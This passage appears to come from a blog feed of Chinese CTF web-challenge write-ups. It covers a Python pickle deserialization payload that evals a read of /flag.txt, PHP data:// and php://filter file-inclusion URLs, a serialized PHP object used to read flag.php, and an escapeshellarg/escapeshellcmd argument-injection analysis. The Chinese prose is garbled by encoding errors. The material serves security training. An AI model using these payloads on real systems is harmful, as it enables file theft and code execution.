class="hljs-keyword"><code class="language-hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">payload</span><span class="hljs-params">(object)</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span><span class="hljs-params">(self)</span>:</span><br>       <span class="hljs-keyword">return</span> (eval, (<span class="hljs-string">"open('/flag.txt','r').read()"</span>,))<br><br>a = pickle.dumps(payload())<br>a = urllib.quote(a)<br><span class="hljs-keyword">print</span> a<br></code></pre></td></tr></tbody></table></figure><p>å†å°†aä¼ ç»™becomeå³å¯<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/19.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/20.jpg" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pythonååºåˆ—åŒ– </tag>
            
            <tag> pickleï¼ŒWeb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[ZJCTF 2019]NiZhuanSiWei</title>
      <link href="/LawlietLW.github.io/2020/02/10/zjctf-2019-nizhuansiwei/"/>
      <url>/LawlietLW.github.io/2020/02/10/zjctf-2019-nizhuansiwei/</url>
      
        <content type="html"><![CDATA[<p>æ‰“å¼€ç¯å¢ƒï¼Œç›´æ¥ç»™å‡ºäº†æºä»£ç </p><figure class="hljs highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre class=" language-hljs php"><span class="hljs-meta">&lt;?php</span>  <br>$text = $_GET[<span class="hljs-string">"text"</span>];<br>$file = $_GET[<span class="hljs-string">"file"</span>];<br>$password = $_GET[<span class="hljs-string">"password"</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="hljs-string">'r'</span>)===<span class="hljs-string">"welcome to the zjctf"</span>)){<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="hljs-string">'r'</span>).<span class="hljs-string">"&lt;/h1&gt;&lt;/br&gt;"</span>;<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">"/flag/"</span>,$file)){<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"Not now!"</span>;<br>        <span class="hljs-keyword">exit</span>(); <br>    }<span class="hljs-keyword">else</span>{<br>        <span class="hljs-keyword">include</span>($file);  <span class="hljs-comment">//useless.php</span><br>        $password = unserialize($password);<br>        <span class="hljs-keyword">echo</span> $password;<br>    }<br>}<br><span class="hljs-keyword">else</span>{<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>}<br><span class="hljs-meta"><code class="language-hljs php"><span class="hljs-meta">&lt;?php</span>  <br>$text = $_GET[<span class="hljs-string">"text"</span>];<br>$file = $_GET[<span class="hljs-string">"file"</span>];<br>$password = $_GET[<span class="hljs-string">"password"</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="hljs-string">'r'</span>)===<span class="hljs-string">"welcome to the zjctf"</span>)){<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="hljs-string">'r'</span>).<span class="hljs-string">"&lt;/h1&gt;&lt;/br&gt;"</span>;<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">"/flag/"</span>,$file)){<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"Not now!"</span>;<br>        <span class="hljs-keyword">exit</span>(); <br>    }<span class="hljs-keyword">else</span>{<br>        <span class="hljs-keyword">include</span>($file);  <span class="hljs-comment">//useless.php</span><br>        $password = unserialize($password);<br>        <span class="hljs-keyword">echo</span> $password;<br>    }<br>}<br><span class="hljs-keyword">else</span>{<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>}<br><span class="hljs-meta">?></span><br></code></pre></td></tr></tbody></table></figure><p>å®¡è®¡æºä»£ç <br>å¯ä»¥ä¼ å…¥text,fileå’Œpasswordå‚æ•°ï¼Œfileå‚æ•°éœ€è¦æˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªæ–‡ä»¶ï¼Œä¸”æ–‡ä»¶å†…å®¹ä¸ºâ€welcome to the zjctfâ€<br>ç”¨file_get_contentsè¯»å–fileå‚æ•°<br><a href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/#data" target="_blank" rel="noopener">æ–‡ä»¶åŒ…å«æ¼æ´ä¸phpä¼ªåè®®</a><br>æˆ‘ä»¬å¯ä»¥ç”¨data://ä¼ªåè®®å°†å†…å®¹å†™ç„¶åå†è®©file_get_contentsè¯»å–<br>payload:</p><figure class="hljs highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs bash"><code class="language-hljs bash">http://89071de8-6fdf-46b3-877a-fc3da9efac70.node3.buuoj.cn/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=<br></code></pre></td></tr></tbody></table></figure><p><img src="/LawlietLW.github.io/2020/02/10/zjctf-2019-nizhuansiwei/1.jpg" alt=""><br>å¾€åçœ‹<br>fileä¼šè¢«includeï¼Œä½†flagè¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½ç›´æ¥åŒ…å«flag.php<br>ä½†ç»™äº†æç¤ºæœ‰useless.php,é‚£æˆ‘ä»¬å°±åŒ…å«useless.php<br>å¯ä»¥ç”¨php://filterä¼ªåè®®è¯»å–useless.phpçš„æºä»£ç <br>payload:</p><figure class="hljs highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs bash"><code class="language-hljs bash">http://89071de8-6fdf-46b3-877a-fc3da9efac70.node3.buuoj.cn/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=php://filter/convert.base64-encode/resource=useless.php<br></code></pre></td></tr></tbody></table></figure><p><img src="/LawlietLW.github.io/2020/02/10/zjctf-2019-nizhuansiwei/2.jpg" alt=""><br>å°†å¾—åˆ°çš„base64å­—ç¬¦ä¸²è§£ç </p><figure class="hljs highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre class=" language-hljs php"><span class="hljs-meta">&lt;?php</span>  <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>{  <span class="hljs-comment">//flag.php  </span><br>    <span class="hljs-keyword">public</span> $file;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span><span class="hljs-params">()</span></span>{  <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;file)){  <br>            <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-keyword">$this</span>-&gt;file); <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">"U R SO CLOSE !///COME ON PLZ"</span>);<br>        }  <br>    }  <br>}  <br><span class="hljs-meta"><code class="language-hljs php"><span class="hljs-meta">&lt;?php</span>  <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>{  <span class="hljs-comment">//flag.php  </span><br>    <span class="hljs-keyword">public</span> $file;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span><span class="hljs-params">()</span></span>{  <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;file)){  <br>            <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-keyword">$this</span>-&gt;file); <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">"U R SO CLOSE !///COME ON PLZ"</span>);<br>        }  <br>    }  <br>}  <br><span class="hljs-meta">?></span><br></code></pre></td></tr></tbody></table></figure><p>å®¡è®¡ä»£ç <br>å®šä¹‰äº†Flagç±»ï¼Œæœ‰ä¸€ä¸ªfileå±æ€§<br>__tostring()é­”æœ¯æ–¹æ³•ä¼šè¯»å–fileçš„å†…å®¹</p><p>å†çœ‹åˆ°ä¹‹å‰çš„ä»£ç </p><figure class="hljs highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre class=" language-hljs php">$password = $_GET[<span class="hljs-string">"password"</span>];<br>$password = unserialize($password);<br><span class="hljs-keyword"><code class="language-hljs php">$password = $_GET[<span class="hljs-string">"password"</span>];<br>$password = unserialize($password);<br><span class="hljs-keyword">echo</span> $password;<br></code></pre></td></tr></tbody></table></figure><p>è¾“å‡ºååºåˆ—åŒ–ä¹‹åçš„passwordå‚æ•°<br>æ®æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥å°†Flagç±»çš„fileå±æ€§è®¾ç½®ä¸ºflag.phpï¼Œç„¶åä¼ å…¥passwordå‚æ•°å³å¯</p><figure class="hljs highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre class=" language-hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>{  <span class="hljs-comment">//flag.php  </span><br>    <span class="hljs-keyword">public</span> $file=<span class="hljs-string">'flag.php'</span>;<br>    }  <br>$a=<span class="hljs-keyword">new</span> Flag;<br>$a=serialize($a);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">"$a"</span>;<br><span class="hljs-comment">//O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}</span><br><span class="hljs-meta"><code class="language-hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>{  <span class="hljs-comment">//flag.php  </span><br>    <span class="hljs-keyword">public</span> $file=<span class="hljs-string">'flag.php'</span>;<br>    }  <br>$a=<span class="hljs-keyword">new</span> Flag;<br>$a=serialize($a);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">"$a"</span>;<br><span class="hljs-comment">//O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}</span><br><span class="hljs-meta">?></span><br></code></pre></td></tr></tbody></table></figure><p>payload:</p><figure class="hljs highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs bash">http://89071de8-6fdf-46b3-877a-fc3da9efac70.node3.buuoj.cn/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:<span class="hljs-string">"Flag"</span>:1:{s:4:<span class="hljs-string">"file"</span>;s:8:<span class="hljs-string"><code class="language-hljs bash">http://89071de8-6fdf-46b3-877a-fc3da9efac70.node3.buuoj.cn/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:<span class="hljs-string">"Flag"</span>:1:{s:4:<span class="hljs-string">"file"</span>;s:8:<span class="hljs-string">"flag.php"</span>;}<br></code></pre></td></tr></tbody></table></figure><p><img src="/LawlietLW.github.io/2020/02/10/zjctf-2019-nizhuansiwei/3.jpg" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> dataä¼ªåè®® </tag>
            
            <tag> filterä¼ªåè®® </tag>
            
            <tag> PHPååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[BUUCTF 2018]Online Tool</title>
      <link href="/LawlietLW.github.io/2020/02/09/buuctf-2018-online-tool/"/>
      <url>/LawlietLW.github.io/2020/02/09/buuctf-2018-online-tool/</url>
      
        <content type="html"><![CDATA[<p>æ‰“å¼€ç¯å¢ƒ<br><a href="1.jpg"></a><br>ç›´æ¥ç»™å‡ºæºä»£ç ï¼Œä»£ç å®¡è®¡</p><figure class="hljs highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre class=" language-hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_SERVER[<span class="hljs-string">'HTTP_X_FORWARDED_FOR'</span>])) {<br>    $_SERVER[<span class="hljs-string">'REMOTE_ADDR'</span>] = $_SERVER[<span class="hljs-string">'HTTP_X_FORWARDED_FOR'</span>];<br>}<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'host'</span>])) {<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>} <span class="hljs-keyword">else</span> {<br>    $host = $_GET[<span class="hljs-string">'host'</span>];<br>    $host = escapeshellarg($host);<br>    $host = escapeshellcmd($host);<br>    $sandbox = md5(<span class="hljs-string">"glzjin"</span>. $_SERVER[<span class="hljs-string">'REMOTE_ADDR'</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">'you are in sandbox '</span>.$sandbox;<br>    @mkdir($sandbox);<br>    chdir($sandbox);<br>    <span class="hljs-keyword">echo</span> system(<span class="hljs-string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span>.$host);<br>}<br><span class="hljs-meta"><code class="language-hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_SERVER[<span class="hljs-string">'HTTP_X_FORWARDED_FOR'</span>])) {<br>    $_SERVER[<span class="hljs-string">'REMOTE_ADDR'</span>] = $_SERVER[<span class="hljs-string">'HTTP_X_FORWARDED_FOR'</span>];<br>}<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'host'</span>])) {<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>} <span class="hljs-keyword">else</span> {<br>    $host = $_GET[<span class="hljs-string">'host'</span>];<br>    $host = escapeshellarg($host);<br>    $host = escapeshellcmd($host);<br>    $sandbox = md5(<span class="hljs-string">"glzjin"</span>. $_SERVER[<span class="hljs-string">'REMOTE_ADDR'</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">'you are in sandbox '</span>.$sandbox;<br>    @mkdir($sandbox);<br>    chdir($sandbox);<br>    <span class="hljs-keyword">echo</span> system(<span class="hljs-string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span>.$host);<br>}<br><span class="hljs-meta">?></span><br></code></pre></td></tr></tbody></table></figure><p><code>_SERVER['HTTP_X_FORWARDED_FOR'],$_SERVER['REMOTE_ADDR']</code>ï¼ŒæŠŠç”¨æˆ·IPè®¾ç½®ä¸ºç”¨æˆ·çš„x_forwarded_for<br>ä¼ å…¥ä¸€ä¸ªhostå‚æ•°ï¼Œè¿ç»­å¯¹hostç”¨<code>escapeshellargå’Œescapeshellcmdå¤„ç†</code><br>è¿™ä¿©å‡½æ•°æ²¡è§è¿‡ï¼ŒæŸ¥ä¸€ä¸‹</p><figure class="hljs highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre class=" language-hljs bash">escapeshellarg() å°†ç»™å­—ç¬¦ä¸²å¢åŠ ä¸€ä¸ªå•å¼•å·å¹¶ä¸”èƒ½å¼•ç”¨æˆ–è€…è½¬ç ä»»ä½•å·²ç»å­˜åœ¨çš„å•å¼•å·ï¼Œè¿™æ ·ä»¥ç¡®ä¿èƒ½å¤Ÿç›´æ¥å°†ä¸€ä¸ªå­—ç¬¦ä¸²ä¼ å…¥ shell å‡½æ•°ï¼Œå¹¶ä¸”è¿˜æ˜¯ç¡®ä¿å®‰å…¨çš„ã€‚å¯¹äºç”¨æˆ·è¾“å…¥çš„éƒ¨åˆ†å‚æ•°å°±åº”è¯¥ä½¿ç”¨è¿™ä¸ªå‡½æ•°ã€‚shell å‡½æ•°åŒ…å« <span class="hljs-built_in">exec</span>(), system() æ‰§è¡Œè¿ç®—ç¬¦ <br>escapeshellcmd() å¯¹å­—ç¬¦ä¸²ä¸­å¯èƒ½ä¼šæ¬ºéª— shell å‘½ä»¤æ‰§è¡Œä»»æ„å‘½ä»¤çš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰ã€‚ æ­¤å‡½æ•°ä¿è¯ç”¨æˆ·è¾“å…¥çš„æ•°æ®åœ¨ä¼ é€åˆ° <span class="hljs-built_in"><code class="language-hljs bash">escapeshellarg() å°†ç»™å­—ç¬¦ä¸²å¢åŠ ä¸€ä¸ªå•å¼•å·å¹¶ä¸”èƒ½å¼•ç”¨æˆ–è€…è½¬ç ä»»ä½•å·²ç»å­˜åœ¨çš„å•å¼•å·ï¼Œè¿™æ ·ä»¥ç¡®ä¿èƒ½å¤Ÿç›´æ¥å°†ä¸€ä¸ªå­—ç¬¦ä¸²ä¼ å…¥ shell å‡½æ•°ï¼Œå¹¶ä¸”è¿˜æ˜¯ç¡®ä¿å®‰å…¨çš„ã€‚å¯¹äºç”¨æˆ·è¾“å…¥çš„éƒ¨åˆ†å‚æ•°å°±åº”è¯¥ä½¿ç”¨è¿™ä¸ªå‡½æ•°ã€‚shell å‡½æ•°åŒ…å« <span class="hljs-built_in">exec</span>(), system() æ‰§è¡Œè¿ç®—ç¬¦ <br>escapeshellcmd() å¯¹å­—ç¬¦ä¸²ä¸­å¯èƒ½ä¼šæ¬ºéª— shell å‘½ä»¤æ‰§è¡Œä»»æ„å‘½ä»¤çš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰ã€‚ æ­¤å‡½æ•°ä¿è¯ç”¨æˆ·è¾“å…¥çš„æ•°æ®åœ¨ä¼ é€åˆ° <span class="hljs-built_in">exec</span>() æˆ– system() å‡½æ•°ï¼Œæˆ–è€… æ‰§è¡Œæ“ä½œç¬¦ ä¹‹å‰è¿›è¡Œè½¬ä¹‰<br></code></pre></td></tr></tbody></table></figure><p>è¿™ä¸¤ä¸ªå‡½æ•°æ”¾åœ¨ä¸€èµ·è‚¯å®šä¼šé€ æˆæ¼æ´(ä¸ç„¶ä¸ºå•¥æ”¾åœ¨ç®€çŸ­çš„æºä»£ç é‡Œ)<br>æœç„¶å¯ä»¥æŸ¥åˆ°è¿™ä¸¤ä¸ªå‡½æ•°çš„æ¼æ´<br><a href="https://paper.seebug.org/164/" target="_blank" rel="noopener">PHP escapeshellarg()+escapeshellcmd() ä¹‹æ®‡</a></p><figure class="hljs highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre class=" language-hljs bash">ä¼ å…¥çš„å‚æ•°æ˜¯ï¼š172.17.0.2<span class="hljs-string">' -v -d a=1<br>ç»è¿‡escapeshellargå¤„ç†åå˜æˆäº†'</span>172.17.0.2<span class="hljs-string">'\'</span><span class="hljs-string">' -v -d a=1'</span>ï¼Œå³å…ˆå¯¹å•å¼•å·è½¬ä¹‰ï¼Œå†ç”¨å•å¼•å·å°†å·¦å³ä¸¤éƒ¨åˆ†æ‹¬èµ·æ¥ä»è€Œèµ·åˆ°è¿æ¥çš„ä½œç”¨ã€‚<br>ç»è¿‡escapeshellcmdå¤„ç†åå˜æˆ<span class="hljs-string">'172.17.0.2'</span>\\<span class="hljs-string">''</span> -v -d a=1\<span class="hljs-string">'ï¼Œè¿™æ˜¯å› ä¸ºescapeshellcmdå¯¹\ä»¥åŠæœ€åé‚£ä¸ªä¸é…å¯¹å„¿çš„å¼•å·è¿›è¡Œäº†è½¬ä¹‰ï¼šhttp://php.net/manual/zh/function.escapeshellcmd.php<br>æœ€åæ‰§è¡Œçš„å‘½ä»¤æ˜¯curl '</span>172.17.0.2<span class="hljs-string">'\\'</span><span class="hljs-string">' -v -d a=1\'</span>ï¼Œç”±äºä¸­é—´çš„\\è¢«è§£é‡Šä¸º\è€Œä¸å†æ˜¯è½¬ä¹‰å­—ç¬¦ï¼Œæ‰€ä»¥åé¢çš„<span class="hljs-string">'æ²¡æœ‰è¢«è½¬ä¹‰ï¼Œä¸å†åé¢çš„'</span>é…å¯¹å„¿æˆäº†ä¸€ä¸ªç©ºç™½è¿æ¥ç¬¦ã€‚æ‰€ä»¥å¯ä»¥ç®€åŒ–ä¸ºcurl 172.17.0.2\ -v -d a=1<span class="hljs-string"><code class="language-hljs bash">ä¼ å…¥çš„å‚æ•°æ˜¯ï¼š172.17.0.2<span class="hljs-string">' -v -d a=1<br>ç»è¿‡escapeshellargå¤„ç†åå˜æˆäº†'</span>172.17.0.2<span class="hljs-string">'\'</span><span class="hljs-string">' -v -d a=1'</span>ï¼Œå³å…ˆå¯¹å•å¼•å·è½¬ä¹‰ï¼Œå†ç”¨å•å¼•å·å°†å·¦å³ä¸¤éƒ¨åˆ†æ‹¬èµ·æ¥ä»è€Œèµ·åˆ°è¿æ¥çš„ä½œç”¨ã€‚<br>ç»è¿‡escapeshellcmdå¤„ç†åå˜æˆ<span class="hljs-string">'172.17.0.2'</span>\\<span class="hljs-string">''</span> -v -d a=1\<span class="hljs-string">'ï¼Œè¿™æ˜¯å› ä¸ºescapeshellcmdå¯¹\ä»¥åŠæœ€åé‚£ä¸ªä¸é…å¯¹å„¿çš„å¼•å·è¿›è¡Œäº†è½¬ä¹‰ï¼šhttp://php.net/manual/zh/function.escapeshellcmd.php<br>æœ€åæ‰§è¡Œçš„å‘½ä»¤æ˜¯curl '</span>172.17.0.2<span class="hljs-string">'\\'</span><span class="hljs-string">' -v -d a=1\'</span>ï¼Œç”±äºä¸­é—´çš„\\è¢«è§£é‡Šä¸º\è€Œä¸å†æ˜¯è½¬ä¹‰å­—ç¬¦ï¼Œæ‰€ä»¥åé¢çš„<span class="hljs-string">'æ²¡æœ‰è¢«è½¬ä¹‰ï¼Œä¸å†åé¢çš„'</span>é…å¯¹å„¿æˆäº†ä¸€ä¸ªç©ºç™½è¿æ¥ç¬¦ã€‚æ‰€ä»¥å¯ä»¥ç®€åŒ–ä¸ºcurl 172.17.0.2\ -v -d a=1<span class="hljs-string">'ï¼Œå³å‘172.17.0.2\å‘èµ·è¯·æ±‚ï¼ŒPOST æ•°æ®ä¸ºa=1'</span> <br><br>å®ƒä»¬åœ¨é…åˆæ—¶å¹¶æ²¡æœ‰è€ƒè™‘åˆ°å•å¼•å·å¸¦æ¥çš„éšæ‚£<br></code></pre></td></tr></tbody></table></figure><p>å°±æ˜¯è¯´ä¸¤æ¬¡è½¬ä¹‰åå•å¼•å·å‡ºé—®é¢˜äº†<br>å†å¾€ä¸‹çœ‹ï¼Œsystemä¼šæ‰§è¡Œnmapçš„å‘½ä»¤ï¼Œæ‰«æ$hostæŒ‡å®šçš„æœºå™¨<br>å¾ˆæ˜¾ç„¶æˆ‘ä»¬éœ€è¦åˆ©ç”¨nmapæ¥åšäº›ä»€ä¹ˆ</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> ç»•è¿‡escapeshellarg()+escapeshellcmd() </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File</title>
      <link href="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-secret-file/"/>
      <url>/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-secret-file/</url>
      
        <content type="html"><![CDATA[<p>æ‰“å¼€ç¯å¢ƒ<br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-secret-file/1.jpg" alt=""><br>æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°ä¸€ä¸ªé¡µé¢<br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-secret-file/2.jpg" alt=""><br>è·³è½¬è¿‡å»<br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-secret-file/3.jpg" alt=""><br>ç‚¹ä¸€ä¸‹secret<br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-secret-file/4.jpg" alt=""><br>çœ‹åˆ°è¿™ä¸ªé¡µé¢æœæ–­ä¸Šburp<br>å¾—åˆ°å¦ä¸€ä¸ªé¡µé¢<br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-secret-file/5.jpg" alt=""><br>è·³è½¬è¿‡å»å¾—åˆ°ä»£ç </p><figure class="hljs highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre class=" language-hljs php"><span class="hljs-meta">&lt;?php</span><br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>    error_reporting(<span class="hljs-number">0</span>);<br>    $file=$_GET[<span class="hljs-string">'file'</span>];<br>    <span class="hljs-keyword">if</span>(strstr($file,<span class="hljs-string">"../"</span>)||stristr($file, <span class="hljs-string">"tp"</span>)||stristr($file,<span class="hljs-string">"input"</span>)||stristr($file,<span class="hljs-string">"data"</span>)){<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"Oh no!"</span>;<br>        <span class="hljs-keyword">exit</span>();<br>    }<br>    <span class="hljs-keyword">include</span>($file); <br><span class="hljs-comment">//flagæ”¾åœ¨äº†flag.phpé‡Œ</span><br><span class="hljs-meta"><code class="language-hljs php"><span class="hljs-meta">&lt;?php</span><br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>    error_reporting(<span class="hljs-number">0</span>);<br>    $file=$_GET[<span class="hljs-string">'file'</span>];<br>    <span class="hljs-keyword">if</span>(strstr($file,<span class="hljs-string">"../"</span>)||stristr($file, <span class="hljs-string">"tp"</span>)||stristr($file,<span class="hljs-string">"input"</span>)||stristr($file,<span class="hljs-string">"data"</span>)){<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"Oh no!"</span>;<br>        <span class="hljs-keyword">exit</span>();<br>    }<br>    <span class="hljs-keyword">include</span>($file); <br><span class="hljs-comment">//flagæ”¾åœ¨äº†flag.phpé‡Œ</span><br><span class="hljs-meta">?></span><br></code></pre></td></tr></tbody></table></figure><p>æ ¹æ®ç¨‹åºï¼Œæˆ‘ä»¬è¦ä¼ å…¥ä¸€ä¸ªfileå‚æ•°ä¸ºflag.php<br>ç„¶è€Œå´å›æ˜¾äº†è¿™ä¹ˆä¸€ä¸ªé¡µé¢<br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-secret-file/6.jpg" 